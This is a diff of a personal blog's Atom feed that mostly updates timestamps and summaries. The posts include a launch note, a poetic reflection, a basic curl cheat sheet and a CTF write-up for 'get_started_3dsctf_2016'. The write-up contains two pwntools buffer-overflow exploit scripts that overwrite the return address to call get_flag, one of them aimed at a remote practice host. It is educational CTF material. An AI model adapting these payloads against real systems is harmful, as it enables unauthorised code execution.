@@ -6,7 +6,7 @@
   <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
   
   <link href="https://pr0b1em.github.io/"/>
-  <updated>2021-06-18T02:45:38.230Z</updated>
+  <updated>2021-06-18T03:11:01.418Z</updated>
   <id>https://pr0b1em.github.io/</id>
   
   <author>
@@ -21,13 +21,17 @@
     <link href="https://pr0b1em.github.io/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/"/>
     <id>https://pr0b1em.github.io/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</id>
     <published>2021-06-17T10:17:26.000Z</published>
-    <updated>2021-06-18T02:45:38.230Z</updated>
+    <updated>2021-06-18T03:11:01.418Z</updated>
     
-    <content type="html"><![CDATA[<p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>]]></content>
+    <content type="html"><![CDATA[<span id="more"></span><p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>]]></content>
     
     
-    <summary type="html">&lt;p&gt;经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！&lt;br&gt;&lt;img src=&quot;/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg&quot;&gt;&lt;/p&gt;
+      
+      
+    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
+&lt;p&gt;经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！&lt;br&gt;&lt;img src=&quot;/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg&quot;&gt;&lt;/p&gt;
 </summary>
+      
     
     
     
@@ -41,20 +45,17 @@
     <link href="https://pr0b1em.github.io/2021/06/17/get_started_3dsctf_2016/"/>
     <id>https://pr0b1em.github.io/2021/06/17/get_started_3dsctf_2016/</id>
     <published>2021-06-17T10:17:26.000Z</published>
-    <updated>2021-06-18T02:45:36.742Z</updated>
+    <updated>2021-06-18T03:10:44.675Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>先查壳，32位，开了NX</p><p><img src="/img/image-20210425011728468.png"></p><p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p><p><img src="/img/image-20210425011933854.png"></p><p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p><p><img src="/img/image-20210425012146370.png"></p><p>点击a1查看到了在栈中的位置</p><p><img src="/img/image-20210425012353464.png"></p><p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p><p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p><p><img src="/img/image-20210425012826978.png"></p><p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p><p><img src="/img/image-20210425013007535.png"></p><p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p><p><img src="/img/image-20210425013149728.png"></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot; , 26419)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>但是没办法得到flag，这里还发现这样远程是无法连接的</p><p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p><p><img src="/img/image-20210425162841539.png"></p><h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26419</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20210425165227769.png"></p><p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>]]></content>
+    <content type="html"><![CDATA[<span id="more"></span><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>先查壳，32位，开了NX</p><p><img src="/img/image-20210425011728468.png"></p><p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p><p><img src="/img/image-20210425011933854.png"></p><p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p><p><img src="/img/image-20210425012146370.png"></p><p>点击a1查看到了在栈中的位置</p><p><img src="/img/image-20210425012353464.png"></p><p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p><p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p><p><img src="/img/image-20210425012826978.png"></p><p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p><p><img src="/img/image-20210425013007535.png"></p><p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p><p><img src="/img/image-20210425013149728.png"></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot; , 26419)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>但是没办法得到flag，这里还发现这样远程是无法连接的</p><p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p><p><img src="/img/image-20210425162841539.png"></p><h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26419</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20210425165227769.png"></p><p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>]]></content>
     
     
-    <summary type="html">&lt;h1 id=&quot;get-started-3dsctf-2016&quot;&gt;&lt;a href=&quot;#get-started-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;get_started_3dsctf_2016&quot;&gt;&lt;/a&gt;get_started_3dsctf_2016&lt;/h1&gt;&lt;p&gt;先查壳，32位，开了NX&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210425011728468.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;IDA打开，main函数上的get_flag函数里发现一个flag.txt&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210425011933854.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;amp;&amp;amp; a2 == 425138641时&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210425012146370.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;点击a1查看到了在栈中的位置&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/img/image-20210425012353464.png&quot;&gt;&lt;/p&gt;
-&lt;p&gt;但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制&lt;/p&gt;</summary>
+      
+      
+    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
+
+&lt;h1 id=&quot;get-started-3dsctf-2016&quot;&gt;&lt;a href=&quot;#get-started-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;get_started_3dsctf_20</summary>
+      
     
     
     
@@ -68,14 +69,16 @@
     <link href="https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/"/>
     <id>https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</id>
     <published>2021-06-17T10:17:26.000Z</published>
-    <updated>2021-06-18T02:45:35.950Z</updated>
+    <updated>2021-06-18T03:10:52.823Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p><p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>]]></content>
+    <content type="html"><![CDATA[<span id="more"></span><h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p><p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>]]></content>
     
     
-    <summary type="html">&lt;h3 id=&quot;又是一年夏天，又是一年仙剑&quot;&gt;&lt;a href=&quot;#又是一年夏天，又是一年仙剑&quot; class=&quot;headerlink&quot; title=&quot;又是一年夏天，又是一年仙剑&quot;&gt;&lt;/a&gt;又是一年夏天，又是一年仙剑&lt;/h3&gt;&lt;p&gt;九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。&lt;/p&gt;
-&lt;p&gt;哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。&lt;/p&gt;
-</summary>
+      
+      
+    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
+&lt;h3 id=&quot;又是一年夏天，又是一年仙剑&quot;&gt;&lt;a href=&quot;#又是一年夏天，又是一年仙剑&quot; class=&quot;headerlink&quot; title=&quot;又是一年夏天，又是一年仙剑&quot;&gt;&lt;/a&gt;又是一年夏天，又是一年仙剑&lt;/h3&gt;&lt;p&gt;九叶</summary>
+      
     
     
     
@@ -89,13 +92,12 @@
     <link href="https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/"/>
     <id>https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</id>
     <published>2021-06-17T10:17:26.000Z</published>
-    <updated>2021-06-18T02:45:37.456Z</updated>
+    <updated>2021-06-18T03:10:56.852Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span><p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>]]></content>
     
     
-    <summary type="html">&lt;h1 id=&quot;curl-命令&quot;&gt;&lt;a href=&quot;#curl-命令&quot; class=&quot;headerlink&quot; title=&quot;curl 命令&quot;&gt;&lt;/a&gt;curl 命令&lt;/h1&gt;&lt;p&gt;curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl&lt;br&gt;还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文&lt;br&gt;件等功能&lt;br&gt;1.curl url(获取网址的文本信息)&lt;br&gt;2.curl -i url(获取文本的头部及文本信息)&lt;br&gt;3.curl -x proxy url(使用代理请求网页内容)&lt;br&gt;4.curl -v(获取整个通信过程)&lt;br&gt;5.curl -X url(使用特定方法请求网页文本)&lt;br&gt;6.curl -I url(仅返回头部信息)&lt;/p&gt;
-</summary>
+    <summary type="html">&lt;h1 id=&quot;curl-命令&quot;&gt;&lt;a href=&quot;#curl-命令&quot; class=&quot;headerlink&quot; title=&quot;curl 命令&quot;&gt;&lt;/a&gt;curl 命令&lt;/h1&gt;</summary>
     
     
     
